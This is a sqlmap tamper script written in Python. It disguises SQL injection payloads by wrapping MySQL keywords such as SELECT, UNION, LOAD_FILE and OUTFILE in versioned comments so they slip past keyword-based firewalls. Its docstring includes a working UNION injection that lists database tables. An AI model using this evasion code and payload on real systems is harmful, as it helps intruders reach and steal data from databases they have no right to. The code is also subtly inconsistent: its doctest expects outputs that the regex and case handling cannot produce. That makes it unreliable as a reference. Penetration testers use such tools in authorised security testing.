#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Replaces common SQL keywords with MySQL versioned comments (e.g., 'SELECT' becomes '/*!50000SELECT*/').

    This technique is useful for bypassing simple keyword-based firewalls and
    intrusion detection systems that don't parse MySQL's versioned comment syntax.
    The '50000' indicates that the enclosed query should only be executed by MySQL
    versions 5.0.0 and above.

    Requirement:
        * MySQL >= 5.0.0

    Notes:
        * This tamper script is designed to be quite aggressive and will comment
          many different keywords.

    >>> tamper("1 AND 1=1 UNION ALL SELECT 1,GROUP_CONCAT(table_name),3 FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=database()")
    '1 AND 1=1 /*!50000UNION*/ /*!50000ALL*/ /*!50000SELECT*/ 1,/*!50000GROUP_CONCAT*/(/*!50000table_name*/),3 /*!50000FROM*/ /*!50000INFORMATION_SCHEMA.TABLES*/ /*!50000WHERE*/ /*!50000table_schema*/=/*!50000database()*/'
    """
    keywords = {
        "SELECT": "/*!50000SELECT*/",
        "UNION": "/*!50000UNION*/",
        "INSERT": "/*!50000INSERT*/",
        "UPDATE": "/*!50000UPDATE*/",
        "DELETE": "/*!50000DELETE*/",
        "FROM": "/*!50000FROM*/",
        "WHERE": "/*!50000WHERE*/",
        "GROUP BY": "/*!50000GROUP BY*/",
        "ORDER BY": "/*!50000ORDER BY*/",
        "LIMIT": "/*!50000LIMIT*/",
        "ALL": "/*!50000ALL*/",
        "DISTINCT": "/*!50000DISTINCT*/",
        "INFORMATION_SCHEMA.TABLES": "/*!50000INFORMATION_SCHEMA.TABLES*/",
        "INFORMATION_SCHEMA.COLUMNS": "/*!50000INFORMATION_SCHEMA.COLUMNS*/",
        "TABLE_NAME": "/*!50000TABLE_NAME*/",
        "COLUMN_NAME": "/*!50000COLUMN_NAME*/",
        "TABLE_SCHEMA": "/*!50000TABLE_SCHEMA*/",
        "CONCAT": "/*!50000CONCAT*/",
        "CONCAT_WS": "/*!50000CONCAT_WS*/",
        "GROUP_CONCAT": "/*!50000GROUP_CONCAT*/",
        "COUNT": "/*!50000COUNT*/",
        "SUBSTRING": "/*!50000SUBSTRING*/",
        "CAST": "/*!50000CAST*/",
        "CHAR": "/*!50000CHAR*/",
        "ASCII": "/*!50000ASCII*/",
        "ORD": "/*!50000ORD*/",
        "BENCHMARK": "/*!50000BENCHMARK*/",
        "SLEEP": "/*!50000SLEEP*/",
        "DATABASE()": "/*!50000DATABASE()*/",
        "USER()": "/*!50000USER()*/",
        "SESSION_USER()": "/*!50000SESSION_USER()*/",
        "SYSTEM_USER()": "/*!50000SYSTEM_USER()*/",
        "VERSION()": "/*!50000VERSION()*/",
        "@@VERSION": "/*!50000@@VERSION*/",
        "@@HOSTNAME": "/*!50000@@HOSTNAME*/",
        "SEPARATOR": "/*!50000SEPARATOR*/",
        "HAVING": "/*!50000HAVING*/",
        "INTO": "/*!50000INTO*/",
        "OUTFILE": "/*!50000OUTFILE*/",
        "DUMPFILE": "/*!50000DUMPFILE*/",
        "LOAD_FILE": "/*!50000LOAD_FILE*/",
    }

    ret_val = payload

    if payload:
        sorted_keywords = sorted(keywords.keys(), key=len, reverse=True)

        for keyword in sorted_keywords:
            if "()" in keyword:
                regex_keyword = re.escape(keyword)
                ret_val = re.sub(r"(?i)\b%s\b" % regex_keyword, keywords[keyword], ret_val)
            else:
                ret_val = re.sub(r"(?i)\b%s\b" % re.escape(keyword), keywords[keyword], ret_val)

    return ret_val
